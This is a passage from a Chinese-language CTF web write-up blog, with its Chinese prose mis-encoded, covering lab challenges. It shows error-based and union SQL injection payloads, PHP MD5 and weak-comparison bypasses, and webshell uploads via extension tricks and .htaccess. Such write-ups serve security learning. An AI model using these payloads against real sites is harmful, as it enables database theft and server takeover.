class="hljs-string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;</span>H4rDsq1<span class="hljs-string">&#x27;))),1))#</span><br></code></pre></td></tr></table></figure><p><img src="/2024/02/12/WebWriteUp5/image-20240212135428321.png" alt="image-20240212135428321"></p><p>æ ¹æ®ä¹‹å‰çš„ç»éªŒï¼Œflagåº”è¯¥å°±åœ¨passwordé‡Œï¼Œç›´æ¥çˆ†æ•°æ®ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;or(updatexml(0,concat(0x7e,(select(group_concat(password))from(H4rDsq1))),1))#</span><br></code></pre></td></tr></table></figure><p>ä¸æ”¾å¿ƒä¹Ÿå¯ä»¥éƒ½çœ‹çœ‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(id,&#x27;</span><span class="hljs-operator">/</span><span class="hljs-string">&#x27;,username,&#x27;</span><span class="hljs-operator">/</span><span class="hljs-string">&#x27;,password))from(H4rDsq1))),1))#</span><br></code></pre></td></tr></table></figure><p><img src="/2024/02/12/WebWriteUp5/image-20240212135822226.png" alt="image-20240212135822226"></p><p>è¿™é‡Œæ˜¯å› ä¸ºupdataxmlåªèƒ½æ˜¾ç¤º32ä½å­—ç¬¦</p><p>sqlä¸­çš„rightå‡½æ•°å³åˆ°å·¦ï¼Œä¹Ÿå°±æ˜¯è¾“å‡ºå³è¾¹çš„ï¼Œleftå‡½æ•°æ˜¯ä»å·¦è¾¹åˆ°å³è¾¹å°±æ˜¯è¾“å‡ºå·¦è¾¹çš„</p><p>æ„é€ payloadï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e,(select(right(password,30))from(H4rDsq1))),1))#</span><br></code></pre></td></tr></table></figure><p><img src="/2024/02/12/WebWriteUp5/image-20240212140151781.png" alt="image-20240212140151781"></p><p>æœ€åå°†ä¸¤æ®µæ‹¼èµ·æ¥å¹¶å»æ‰é‡å¤çš„éƒ¨åˆ†ï¼š</p><p>flag{0738fa38-907b-4661-a4b0-fc6c78dae589}</p><h3 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h3><p><img src="/2024/02/12/WebWriteUp5/image-20240213192437978.png" alt="image-20240213192437978"></p><p>ä¸€è¿›æ¥æ˜¯è¿™ä¹ˆä¸€æ®µè¯</p><p>è¿˜åŸåå¤§æ¦‚æ˜¯ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php">I put something in F12 <span class="hljs-keyword">for</span> you <br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>; <br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>; <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123; <span class="hljs-comment">// ä¼ å…¥ä¸¤ä¸ªGET,ggå’Œid</span><br>    <span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]; <br>    <span class="hljs-variable">$gg</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>]; <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$id</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$gg</span>) &amp;&amp; <span class="hljs-variable">$id</span> !== <span class="hljs-variable">$gg</span>) &#123; <span class="hljs-comment">// ç»è¿‡md5åä¸¤ä¸ªå€¼,å…¨ç­‰ï¼Œä¸”ä¼ å…¥çš„å€¼ä¸ç›¸åŒ</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You got the first step&#x27;</span>; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])) &#123; <span class="hljs-comment">// ä¼ å…¥POST,passwd</span><br>            <span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>]; <br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$passwd</span>)) &#123; <span class="hljs-comment">// passwdä¸èƒ½ä¸ºæ•°å­—</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$passwd</span>==<span class="hljs-number">1234567</span>) &#123; <span class="hljs-comment">// passwdå¿…é¡»è¦å’Œ1234567å¯¹ç­‰</span><br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Good Job!&#x27;</span>; <br>                    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>); <br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;By Retr_0&#x27;</span>); <br>                &#125; <span class="hljs-keyword">else</span> &#123; <br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;can you think twice??&quot;</span>; <br>                    &#125; <br>            &#125; <span class="hljs-keyword">else</span>&#123; <br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You can not get it !&#x27;</span>; <br>                &#125; <br>        &#125; <span class="hljs-keyword">else</span>&#123; <br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;only one way to get the flag&#x27;</span>); <br>            &#125; <br>    &#125; <span class="hljs-keyword">else</span> &#123; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are not a real hacker!&quot;</span>; <br>        &#125; <br>&#125; <span class="hljs-keyword">else</span>&#123; <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Please input first&#x27;</span>); <br>    &#125;<br><span class="hljs-meta">?&gt;</span><br>Please input first<br></code></pre></td></tr></table></figure><ol><li><code>include &#39;flag.php&#39;;</code>ï¼šå¼•å…¥ <code>flag.php</code> æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«äº†ä¸€ä¸ªå˜é‡ <code>$flag</code></li><li><code>if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;])) &#123;</code>ï¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨åä¸º <code>gg</code> å’Œ <code>id</code> çš„ GET å‚æ•°ã€‚</li><li><code>$id=$_GET[&#39;id&#39;]; $gg=$_GET[&#39;gg&#39;];</code>ï¼šå°† <code>id</code> å’Œ <code>gg</code> çš„ GET å‚æ•°çš„å€¼åˆ†åˆ«èµ‹ç»™ <code>$id</code> å’Œ <code>$gg</code> å˜é‡ã€‚</li><li><code>if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</code>ï¼šæ¯”è¾ƒ <code>id</code> å’Œ <code>gg</code> ç»è¿‡ MD5 å“ˆå¸Œåçš„å€¼æ˜¯å¦ç›¸ç­‰ï¼Œä¸”å®ƒä»¬æœ¬èº«ä¸ç›¸ç­‰ã€‚è¿™æ˜¯ä¸ºäº†ç¡®ä¿è¾“å…¥çš„ä¸¤ä¸ªå€¼ä¸åŒã€‚</li><li><code>echo &#39;You got the first step&#39;;</code>ï¼šå¦‚æœä¸Šè¿°æ¡ä»¶æˆç«‹ï¼Œè¾“å‡ºæç¤ºä¿¡æ¯ã€‚</li><li><code>if(isset($_POST[&#39;passwd&#39;])) &#123;</code>ï¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨åä¸º <code>passwd</code> çš„ POST å‚æ•°ã€‚</li><li><code>$passwd=$_POST[&#39;passwd&#39;];</code>ï¼šå°† <code>passwd</code> çš„ POST å‚æ•°çš„å€¼èµ‹ç»™ <code>$passwd</code> å˜é‡ã€‚</li><li><code>if (!is_numeric($passwd)) &#123;</code>ï¼šæ£€æŸ¥ <code>$passwd</code> æ˜¯å¦ä¸ºæ•°å­—ã€‚</li><li><code>if($passwd==1234567) &#123;</code>ï¼šå¦‚æœ <code>$passwd</code> çš„å€¼ç­‰äº <code>1234567</code>ï¼Œè¾“å‡ºæˆåŠŸä¿¡æ¯ï¼ŒåŒ…æ‹¬ flag æ–‡ä»¶çš„å†…å®¹ï¼Œå¹¶ç»“æŸç¨‹åºã€‚</li><li><code>else &#123; echo &quot;can you think twice??&quot;; &#125;</code>ï¼šå¦‚æœå¯†ç ä¸ç­‰äº <code>1234567</code>ï¼Œè¾“å‡ºæç¤ºä¿¡æ¯ã€‚</li><li><code>&#125; else&#123; echo &#39;You can not get it !&#39;; &#125;</code>ï¼šå¦‚æœå¯†ç æ˜¯æ•°å­—ï¼Œè¾“å‡ºæç¤ºä¿¡æ¯ã€‚</li><li><code>&#125; else&#123; die(&#39;only one way to get the flag&#39;); &#125;</code>ï¼šå¦‚æœæ²¡æœ‰æ‰¾åˆ° <code>passwd</code> å‚æ•°ï¼Œè¾“å‡ºæç¤ºä¿¡æ¯ï¼Œç„¶åç»“æŸç¨‹åºã€‚</li><li><code>&#125; else &#123; echo &quot;You are not a real hacker!&quot;; &#125;</code>ï¼šå¦‚æœ <code>id</code> å’Œ <code>gg</code> çš„å€¼ä¸æ»¡è¶³æ¡ä»¶ï¼Œè¾“å‡ºæç¤ºä¿¡æ¯ã€‚</li><li><code>&#125; else&#123; die(&#39;Please input first&#39;); &#125;</code>ï¼šå¦‚æœæ²¡æœ‰æ‰¾åˆ° <code>gg</code> å’Œ <code>id</code> å‚æ•°ï¼Œè¾“å‡ºæç¤ºä¿¡æ¯ï¼Œç„¶åç»“æŸç¨‹åº</li></ol><p>è¿™é‡Œå¾ˆæ˜¾ç„¶å¯ä»¥åˆ©ç”¨ä¹‹å‰å­¦åˆ°çš„ç»•è¿‡md5æ¯”è¾ƒçš„æ–¹å¼ç»•è¿‡idå’Œggçš„æ¯”è¾ƒï¼Œé€šè¿‡å¼±ç±»å‹æ¯”è¾ƒæ¥ç»•è¿‡passwordçš„åˆ¤æ–­</p><p>æ‰€ä»¥åˆ©ç”¨Hackbarï¼Œå¾—åˆ°flag</p><p><img src="/2024/02/12/WebWriteUp5/image-20240213193310068.png" alt="image-20240213193310068"></p><h3 id="babyUpload"><a href="#babyUpload" class="headerlink" title="babyUpload"></a>babyUpload</h3><p><img src="/2024/02/12/WebWriteUp5/image-20240213194207026.png" alt="image-20240213194207026"></p><p>ä¸€ä¸ªå¸¸è§çš„ç•Œé¢ï¼Œéšä¾¿ä¸Šä¼ ä¸€ä¸ªçœ‹çœ‹ï¼Œä¸Šä¼ äº†ä¸€ä¸ªwebshell.phpï¼Œå¾—åˆ°å¦‚ä¸‹ç•Œé¢ï¼š</p><p><img src="/2024/02/12/WebWriteUp5/image-20240213194340429.png" alt="image-20240213194340429"></p><p>è€è§„çŸ©ï¼Œå¼€å§‹æŠ“åŒ…</p><p><img src="/2024/02/12/WebWriteUp5/image-20240213194637057.png" alt="image-20240213194637057"></p><p>åŠ .ç»•è¿‡ï¼Œæç¤ºç±»å‹ï¼Œä¿®æ”¹æˆjpeg</p><p><img src="/2024/02/12/WebWriteUp5/image-20240213194722710.png" alt="image-20240213194722710"></p><p>æ„Ÿè§‰åˆè¦ä½¿ç”¨.htaccessæ–‡ä»¶äº†</p><p><img src="/2024/02/12/WebWriteUp5/image-20240213194940758.png" alt="image-20240213194940758"></p><p>ä¿®æ”¹ç±»å‹ä¹‹åæˆåŠŸä¸Šä¼ ï¼Œä¸Šä¼ ä¸€ä¸ªwebshell.jpgæ–‡ä»¶ï¼Œä½†ä¾ç„¶æ— æ³•é€šè¿‡ï¼Œçœ‹èµ·æ¥æ˜¯æ£€æµ‹äº†å†…å®¹</p><p><img src="/2024/02/12/WebWriteUp5/image-20240213195059910.png" alt="image-20240213195059910"></p><p>åˆ©ç”¨script+phpç»•è¿‡è¯•è¯•</p><p><img src="/2024/02/12/WebWriteUp5/image-20240213195723114.png" alt="image-20240213195723114"></p><p>æˆåŠŸä¸Šä¼ </p><p>ç”¨èšå‰‘è¿æ¥ï¼Œæ ¹ç›®å½•ä¸‹æ‰¾åˆ°flag</p><h3 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h3><p><img src="/2024/02/12/WebWriteUp5/image-20240214211342565.png" alt="image-20240214211342565"></p><p>éšä¾¿è¾“å…¥ï¼Œå°è¯•ï¼Œæç¤ºé”™è¯¯çš„ç”¨æˆ·å</p><p><img src="/2024/02/12/WebWriteUp5/image-20240214211509277.png" alt="image-20240214211509277"></p><p>å°†ç”¨æˆ·åæ”¹æˆ1â€˜ or 1&#x3D;1å</p><p>æç¤ºï¼š</p><p><img src="/2024/02/12/WebWriteUp5/image-20240214211555307.png" alt="image-20240214211555307"></p><p>é‚£æ³¨å…¥ç‚¹åº”è¯¥æ˜¯åœ¨ç”¨æˆ·åè¿™ï¼ŒåŒæ—¶åªæ˜¾ç¤ºäº†wrong userï¼Œæ²¡æŠ¥å¯†ç çš„é”™ï¼Œæœ‰å¯èƒ½æ˜¯å¯†ç ä¼šé€šè¿‡æŸç§æ–¹æ³•è¢«åŠ å¯†ï¼Œé‚£ä¹ˆè¯•ä¸€ä¸‹ä¸‡èƒ½é’¥åŒ™ï¼šadminâ€™ or â€˜1â€™&#x3D;â€˜1â€™#</p><p>é‚£ä¹ˆå†åˆ¤æ–­å­—æ®µæ•°ï¼Œå½“payloadä¸ºï¼šadminâ€™ union select 1,2,3,4#æ—¶ï¼Œå›æ˜¾ï¼š</p><p><img src="/2024/02/12/WebWriteUp5/image-20240214212009506.png" alt="image-20240214212009506"></p><p>ä½†å‰ä¸‰ä¸ªéƒ½å›æ˜¾wrong userï¼Œè¯´æ˜æœ‰ä¸‰ä¸ªå­—æ®µï¼Œä½†ä¸ºadminâ€™ union select 1,2,3#æ—¶</p><p><img src="/2024/02/12/WebWriteUp5/image-20240214214019377.png" alt="image-20240214214019377"></p><p>å›æ˜¾ä¸ºwrong passï¼Œè¯´æ˜é‡Œè¾¹adminä¸ºä¸€ä¸ªæœ‰æ•ˆæ•°æ®ï¼Œé‚£ä¹ˆå°è¯•adminçš„ä½ç½®ï¼ˆå…¶å®è¿™é‡ŒçŒœä¹Ÿèƒ½çŒœåˆ°åœ¨ç¬¬äºŒä¸ªï¼Œæ‰€ä»¥ç›´æ¥æ”¾ç¬¬äºŒä¸ªå°è¯•ï¼‰ï¼šadminâ€™ union select 1,â€™adminâ€™,3#</p><p>å›æ˜¾ä¸ºWrong passï¼Œè¯´æ˜å°±æ˜¯adminåœ¨ç¬¬äºŒä¸ª</p><blockquote><p>æ–°çŸ¥è¯†ç‚¹ï¼š</p><p>Mysqlåœ¨æŸ¥è¯¢ä¸å­˜åœ¨çš„æ•°æ®æ—¶ï¼Œä¼šè‡ªåŠ¨æ„å»ºè™šæ‹Ÿæ•°æ®ï¼Œå­˜å‚¨æ–¹å¼è¦ä¹ˆä¸ºæ˜æ–‡ï¼Œè¦ä¹ˆä¸ºæŸç§åŠ å¯†ï¼ˆé€šå¸¸ä¸ºmd5ï¼‰</p></blockquote><p>åŸç†ï¼š</p><p><img src="/2024/02/12/WebWriteUp5/image-20240214220412035.png" alt="image-20240214220412035"></p><p>æ‰€ä»¥ï¼Œè¿™é‡Œå·²çŸ¥adminä¸ºåˆæ³•ç”¨æˆ·åï¼Œé‚£ä¹ˆå°±æ„å»ºä¸€ä¸ªä¸åˆæ³•çš„ç”¨æˆ·å</p><p>æ„é€ payloadï¼š</p><p>ç”¨æˆ·åï¼š1â€™ union select 1,â€˜adminâ€™,â€™202cb962ac59075b964b07152d234b70â€™</p><p>å¯†ç ï¼š123</p><p>202cb962ac59075b964b07152d234b70ä¸º123çš„md5è®¡ç®—ç»“æœï¼Œå¾—åˆ°flag</p><p><img src="/2024/02/12/WebWriteUp5/image-20240214215313815.png" alt="image-20240214215313815"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WebWriteUp4</title>
    <link href="/2024/02/04/WebWriteUp4/"/>
    <url>/2024/02/04/WebWriteUp4/</url>
    
    <content type="html"><![CDATA[<h3 id="BuyFlag"><a href="#BuyFlag" class="headerlink" title="BuyFlag"></a>BuyFlag</h3><p><img src="/2024/02/04/WebWriteUp4/image-20240204214102827.png" alt="image-20240204214102827"></p><p>è¿›æ¥æ˜¯ä¹‹å‰è§è¿‡çš„ä¸€ä¸ªç•Œé¢ï¼Œé‚£å†æŸ¥çœ‹æºç çœ‹çœ‹</p><p>åœ¨MENUè¿™ä¸ªå…ƒç´ è¿™é‡Œçœ‹åˆ°äº†pay.phpï¼Œç»“åˆé¢˜ç›®åç§°ï¼Œç‚¹è¿›å»çœ‹çœ‹</p><p><img src="/2024/02/04/WebWriteUp4/image-20240204214505526.png" alt="image-20240204214505526"></p><p>é¦–å…ˆï¼Œé¢˜ç›®è¦æ±‚è¦æ˜¯Cuitâ€™s studentsï¼Œæ¶‰åŠåˆ°èº«ä»½éªŒè¯ï¼ŒæŸ¥çœ‹ç½‘é¡µçš„cookie</p><p><img src="/2024/02/04/WebWriteUp4/image-20240204220534659.png" alt="image-20240204220534659"></p><p>å°†userä¿®æ”¹æˆ1</p><p>ç½‘é¡µå˜æˆäº†ï¼š</p><p><img src="/2024/02/04/WebWriteUp4/image-20240204220710021.png" alt="image-20240204220710021"></p><p>æŸ¥çœ‹æºç ï¼š</p><p><img src="/2024/02/04/WebWriteUp4/image-20240204214600079.png" alt="image-20240204214600079"></p><p>é€šè¿‡postæ–¹å¼ä¼ å‚ï¼ŒéªŒè¯passwordæ˜¯å¦ä¸º404ï¼Œä½†æ•°å­—åˆè¢«è¿‡æ»¤æ‰äº†ã€‚è§‚å¯Ÿæºç ï¼ŒéªŒè¯passwordæ—¶ä½¿ç”¨çš„æ˜¯å¼±ç±»å‹æ¯”è¾ƒï¼Œæ‰€ä»¥ï¼Œå¯ä»¥é€šè¿‡ä¾‹å¦‚404abcç»•è¿‡ã€‚</p><p>åŒæ—¶é¡µé¢æç¤ºè¿˜éœ€è¦ä¼ 100000000é’±</p><p>æ„é€ payloadï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">password</span>=404a &amp; <span class="hljs-attribute">money</span>=100000000<br></code></pre></td></tr></table></figure><p><img src="/2024/02/04/WebWriteUp4/image-20240204220846562.png" alt="image-20240204220846562"></p><p><strong>æ–¹æ³•ä¸€</strong></p><p>æ•°å­—å¤ªé•¿ï¼Œå°è¯•ç§‘å­¦è®¡æ•°æ³•</p><p><img src="/2024/02/04/WebWriteUp4/image-20240204220949342.png" alt="image-20240204220949342"></p><p>å¾—åˆ°flag</p><p><strong>æ–¹æ³•äºŒ</strong></p><p>ä½¿ç”¨æ•°ç»„è¿›è¡Œä¼ å‚ï¼Œè·³è¿‡åˆ¤æ–­</p><p>payloadï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">password</span>=<span class="hljs-number">404</span>a &amp; money[]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="EasyMD5"><a href="#EasyMD5" class="headerlink" title="EasyMD5"></a>EasyMD5</h3><p><img src="/2024/02/04/WebWriteUp4/image-20240205203520961.png" alt="image-20240205203520961"></p><p>å°è¯•äº†å„ç§sqlæ³¨å…¥å­—ç¬¦ä¸²å‡æ²¡å¼‚å¸¸</p><p>é‚£ä¹ˆæŠ“åŒ…çœ‹çœ‹ï¼š</p><p><img src="/2024/02/04/WebWriteUp4/image-20240205204003253.png" alt="image-20240205204003253"></p><p>çœ‹åˆ°hintï¼š select * from â€˜adminâ€™ where password&#x3D;md5($pass,true)</p><p>md5å‡½æ•°ç”¨æ³•ï¼š</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">md5(<span class="hljs-type">string</span>,raw)<br><br><span class="hljs-symbol">string:</span>éœ€è¦è®¡ç®—çš„å­—ç¬¦ä¸²<br><span class="hljs-symbol">raw:</span> <span class="hljs-literal">true</span>: <span class="hljs-number">16</span>å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼<br> <span class="hljs-literal">false</span>: <span class="hljs-number">32</span>å­—ç¬¦åå…­è¿›åˆ¶æ ¼å¼<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥è¿™é‡Œéœ€è¦è¿›è¡Œsqlæ³¨å…¥çš„è¯ï¼Œéœ€è¦åˆ©ç”¨mysqlä¸€ä¸ªç‰¹æ€§ï¼š</p><blockquote><p>åœ¨mysqlé‡Œé¢ï¼Œåœ¨ç”¨ä½œå¸ƒå°”å‹åˆ¤æ–­æ—¶ï¼Œä»¥1å¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢«å½“åšæ•´å‹æ•°ã€‚<br>è¦æ³¨æ„çš„æ˜¯è¿™ç§æƒ…å†µæ˜¯å¿…é¡»è¦æœ‰å•å¼•å·æ‹¬èµ·æ¥çš„ï¼Œæ¯”å¦‚password&#x3D;â€˜xxxâ€™ or â€˜1xxxxxxxxxâ€™ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºpassword&#x3D;â€˜xxxâ€™ or 1 ï¼Œä¹Ÿå°±ç›¸å½“äºpassword&#x3D;â€˜xxxâ€™ or trueï¼Œæ‰€ä»¥è¿”å›å€¼å°±æ˜¯true</p></blockquote><p>é‚£ä¹ˆå°±éœ€è¦ä¸€ä¸ªå­—ç¬¦ï¼Œåœ¨è®¡ç®—å®Œè¯¥å­—ç¬¦çš„md5å€¼åï¼Œç»è¿‡hexèƒ½è½¬æˆ â€˜xxxâ€™ or â€˜xxxxâ€™ æ ¼å¼ï¼Œé€šè¿‡åè¾¹çš„å­—ç¬¦ä¸²ç”±æ•°å­—å¼€å¤´ï¼Œå°±èƒ½å°†åŸselectè¯­å¥å˜æˆæ°¸çœŸå¼</p><p>è¿™é‡Œäº†è§£åˆ°ä¸€ä¸ªå¸¸ç”¨å­—ç¬¦ä¸²ï¼šffifdyop</p><p>åç«¯è¯­å¥å°±ä¼šå˜æˆï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">select * <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;admin&#x27;</span> where password=<span class="hljs-string">&#x27;&#x27;</span>o<span class="hljs-string">r&#x27;6xxxxxxx&#x27;</span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥è¿™é‡Œè¾“å…¥ffifdyopï¼Œå¾—åˆ°ï¼š</p><p><img src="/2024/02/04/WebWriteUp4/image-20240205205537445.png" alt="image-20240205205537445"></p><p>çœ‹æ¥è¿˜è¦ç»§ç»­æ³¨å…¥</p><p>æŸ¥çœ‹æºç ï¼š</p><p><img src="/2024/02/04/WebWriteUp4/image-20240205205610457.png" alt="image-20240205205610457"></p><p>è¿™é‡Œåº”è¯¥å°±æ˜¯è®©æˆ‘ä»¬æ‰¾ä¸€å¯¹md5ç¢°æ’ï¼Œä½†å¯ä»¥çœ‹åˆ°ï¼Œä¾æ—§æ˜¯å¼±ç±»å‹æ¯”è¾ƒï¼Œæ‰€ä»¥å…¶å®aï¼Œbåªè¦æ»¡è¶³å…¶md5å€¼çš„å½¢å¼æ˜¯ä¾‹å¦‚1xxxxxï¼Œå°±è¡Œã€‚</p><p>æä¾›ä¸€å¯¹å­—ç¬¦ï¼šQNKCDZOå’Œs214587387aï¼Œé€šè¿‡getæ–¹æ³•ä¼ å‚å³å¯</p><p><img src="/2024/02/04/WebWriteUp4/image-20240205210043709.png" alt="image-20240205210043709"></p><p>è¿™å›ä¸æ˜¯å¼±ç±»å‹æ¯”è¾ƒäº†ï¼Œä½†å¯ä»¥åˆ©ç”¨æ•°ç»„ç»•è¿‡ï¼Œå› ä¸ºï¼šmd5(array()) &#x3D; null</p><blockquote><p>è¡¥å……ï¼š</p><p>strcmp(array(), â€œabcâ€) &#x3D; null<br>strpos(array(),â€abcâ€) &#x3D; null</p></blockquote><p><img src="/2024/02/04/WebWriteUp4/image-20240205210252841.png" alt="image-20240205210252841"></p><p>å³å¯å¾—åˆ°flag</p><h3 id="ä½ ä¼ ä½ ğŸå‘¢"><a href="#ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="ä½ ä¼ ä½ ğŸå‘¢"></a>ä½ ä¼ ä½ ğŸå‘¢</h3><p><img src="/2024/02/04/WebWriteUp4/image-20240208204615216.png" alt="image-20240208204615216"></p><p>è¿›æ¥æ˜¯ä¸€ä¸ªå……æ»¡äº†æŠ½è±¡å…ƒç´ çš„ç•Œé¢</p><p>éšä¾¿ä¸Šä¼ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬webshell.phpï¼Œå¾—åˆ°å¦‚ä¸‹ç•Œé¢</p><p><img src="/2024/02/04/WebWriteUp4/image-20240208204826660.png" alt="image-20240208204826660"></p><p>æŠ“åŒ…çœ‹çœ‹ï¼Œçœ‹ç€ç•Œé¢ä¸Šå·²ç»æœ‰çš„ä¸¤ä¸ªå›¾ç‰‡éƒ½æ˜¯jpgï¼Œæ”¹å˜content-typeè¯•è¯•</p><p><img src="/2024/02/04/WebWriteUp4/image-20240208205237527.png" alt="image-20240208205237527"></p><p>åº”è¯¥å¯¹åç¼€phpè¿˜æœ‰æ£€æµ‹ï¼Œå°è¯•ä¸€äº›æ–¹æ³•ä¹Ÿæ— æ³•ç»•è¿‡</p><p><img src="/2024/02/04/WebWriteUp4/image-20240208205403054.png" alt="image-20240208205403054"></p><p>ä½¿ç”¨php.åç¼€ï¼Œç»•è¿‡æˆåŠŸ</p><p><img src="/2024/02/04/WebWriteUp4/image-20240208205503847.png" alt="image-20240208205503847"></p><p>ä½†ç”¨èšå‰‘è¿æ¥ä¸ä¸Šï¼Œåº”è¯¥æ˜¯ä¸€å¥è¯æœ¨é©¬ç¡®å®ä¸Šä¼ åˆ°äº†åç«¯ï¼Œä½†æ²¡è¢«è§£æï¼Œæ‰€ä»¥åœ¨è¿æ¥çš„æ—¶å€™æ˜¾ç¤ºè¿æ¥æ˜¯ç©ºï¼Œè¿™é‡Œå†é€‰æ‹©ç”¨ä¸Šä¼ .htaccessæ–‡ä»¶ç»•è¿‡</p><p><img src="/2024/02/04/WebWriteUp4/image-20240208211735266.png" alt="image-20240208211735266"></p><p><img src="/2024/02/04/WebWriteUp4/image-20240208211707475.png" alt="image-20240208211707475"></p><p>åœ¨æ ¹ç›®å½•æ‰¾åˆ°flag</p><h3 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h3><p><img src="/2024/02/04/WebWriteUp4/image-20240208212850364.png" alt="image-20240208212850364"></p><p>flag.txt:</p><p><img src="/2024/02/04/WebWriteUp4/image-20240208212917440.png" alt="image-20240208212917440"></p><p>welcome.txt</p><p><img src="/2024/02/04/WebWriteUp4/image-20240208213509159.png" alt="image-20240208213509159"></p><p>hints.txt</p><p><img src="/2024/02/04/WebWriteUp4/image-20240208213530444.png" alt="image-20240208213530444"></p><p><img src="/2024/02/04/WebWriteUp4/image-20240208213639476.png" alt="image-20240208213639476"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯è®¡ç®—äº†filenameçš„hashå€¼ï¼Œæ‰èƒ½è®¿é—®</p><h3 id="NiZhuanSiWei"><a href="#NiZhuanSiWei" class="headerlink" title="NiZhuanSiWei"></a>NiZhuanSiWei</h3><p><img src="/2024/02/04/WebWriteUp4/image-20240209184425988.png" alt="image-20240209184425988"></p><p>éœ€è¦é€šè¿‡GETæ–¹å¼ä¼ 